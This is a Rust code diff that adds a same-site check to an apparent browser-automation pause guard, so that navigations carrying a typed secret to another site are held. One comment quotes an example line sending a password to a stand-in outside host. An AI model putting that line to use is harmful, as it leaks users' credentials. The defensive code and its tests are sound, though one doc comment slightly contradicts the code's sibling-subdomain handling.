@@ -333,10 +333,10 @@ pub async fn install(
                 // other write, **and so is a GET carrying a secret** — pausing is
                 // about what the person is doing, not a permission for the page
                 // to send whatever it likes.
-                if holding.paused() && is_the_person_navigating(&request) {
+                let typed = typed.values();
+                if the_persons_paused_navigation(holding.paused(), &request, &typed) {
                     return route.continue_(None).await;
                 }
-                let typed = typed.values();
                 // A GET is a read, **unless it is carrying a secret**: the same
                 // message to that server as the POST it came from, in a place
                 // nobody looks. Every other GET is a documented residual.
@@ -360,6 +360,114 @@ pub async fn install(
 /// against a route that no longer exists.
 pub fn is_the_person_navigating(request: &Request) -> bool {
     request.is_navigation_request() && request.frame().and_then(|frame| frame.parent_frame()).is_none()
+}
+
+/// Whether this navigation keeps the person where they are: it goes to the site
+/// the frame already shows, or to a subdomain of it.
+///
+/// **"The same site", not "the same host",** because a login is often
+/// `accounts.shop.example` while the shop is `www.shop.example`, and holding
+/// every one of those would make a pause useless for the one thing people do in
+/// one. **There is no public-suffix list here**, so a site is never fewer than
+/// three labels (`shop.example.com` is a site; `com` and `co.uk` are not) and one
+/// host must be a suffix of the other on a label boundary — which is the direction
+/// that cannot be tricked: `shop.example.com.elsewhere.com` does not end with
+/// `shop.example.com`, and `evil-shop.example.com` is not `shop.example.com`.
+///
+/// **The bias is deliberate.** Every uncertainty here is resolved as *held*, so
+/// the failure mode of being wrong about what counts as a site is a person who
+/// waits rather than a secret that leaves.
+pub fn the_persons_paused_navigation(paused: bool, request: &Request, typed: &[String]) -> bool {
+    if !paused || !is_the_person_navigating(request) {
+        return false;
+    }
+    // **A pause is not a page's licence to leave with what the person typed.**
+    // The person pressing a button and a page running
+    // `location.href = "https://elsewhere.example/?p=" + password` are the same
+    // request on the wire, and only one of them is the person. So a navigation
+    // carrying a typed secret goes through **only if it stays on the site the
+    // person is looking at** — their own login, their own password reset, the
+    // redirect that follows both, which are the things a pause exists to let
+    // happen. A secret going to another site is exactly what pausing is for, and
+    // it is held like any other write.
+    !crate::secret::carries(request.url(), typed) || stays_on_the_site(request)
+}
+
+fn stays_on_the_site(request: &Request) -> bool {
+    let Ok(going) = url::Url::parse(request.url()) else {
+        return false;
+    };
+    let Some(here) = request.frame().map(|frame| frame.url()) else {
+        return false;
+    };
+    let Ok(home) = url::Url::parse(&here) else {
+        return false;
+    };
+    match (going.host_str(), home.host_str()) {
+        (Some(going), Some(home)) => same_site(going, home),
+        _ => false,
+    }
+}
+
+/// The registrable-domain test, without a public-suffix list: the same host, or
+/// one of them a subdomain of the other where the shared parent is a site rather
+/// than a suffix somebody owns.
+/// **What counts as the same site, and what is knowingly not counted.**
+///
+/// A site is the host you are on or a subdomain of it: `shop.example.com` and
+/// `accounts.shop.example.com` are one site, and a login that moves between them
+/// is the person's own. The three that are not — a host that merely *ends* with
+/// the site's name, a near miss of it, and two different people on a shared
+/// two-label suffix — are the whole point, because
+/// `shop.example.com.elsewhere.com` is somebody else's server however the string
+/// ends.
+///
+/// **Two sibling subdomains are not the same site here**, and that is a
+/// deliberate gap rather than an oversight: telling `accounts.shop.example.com`
+/// from `www.shop.example.com` needs a public-suffix list, which this crate does
+/// not carry, and the approximation that would allow it is the same suffix match
+/// the third case above defeats. So a person whose site spans siblings sees that
+/// one navigation held while paused — the direction that errs toward holding,
+/// which is the only safe direction to err in.
+#[test]
+fn the_site_a_navigation_stays_on_is_one_a_person_never_left() {
+    assert!(same_site("shop.example.com", "shop.example.com"), "the same host");
+    assert!(same_site("SHOP.example.com", "shop.example.com"), "the same host, read either way");
+    assert!(same_site("shop.example.com.", "shop.example.com"), "a trailing dot is not a difference");
+    assert!(
+        same_site("accounts.shop.example.com", "shop.example.com"),
+        "a subdomain is the site it sits in"
+    );
+    assert!(
+        !same_site("www.shop.example.com", "accounts.shop.example.com"),
+        "two siblings are not counted, and that gap is deliberate"
+    );
+
+    for (going, home) in [
+        // **A suffix match is not a site match.** Both of these end with
+        // `shop.example.com` as a string and are somebody else's server.
+        ("shop.example.com.elsewhere.com", "shop.example.com"),
+        ("evil-shop.example.com", "shop.example.com"),
+        ("notshop.example.com", "shop.example.com"),
+        // And there is no public-suffix list here, so `co.uk` is not a site two
+        // different people are on.
+        ("other.co.uk", "example.co.uk"),
+    ] {
+        assert!(!same_site(going, home), "{going} is not the site {home} is on");
+    }
+}
+
+fn same_site(going: &str, home: &str) -> bool {
+    let going = going.trim_end_matches('.');
+    let home = home.trim_end_matches('.');
+    if going.eq_ignore_ascii_case(home) {
+        return true;
+    }
+    let (short, long) = if going.len() <= home.len() { (going, home) } else { (home, going) };
+    // **On a label boundary**, not anywhere in the string: `notshop.example.com`
+    // ends with `shop.example.com` and is a different site.
+    let boundary = format!(".{short}");
+    short.split('.').count() >= 3 && long.ends_with(&boundary) && long.len() > boundary.len()
 }
 
 #[cfg(test)]
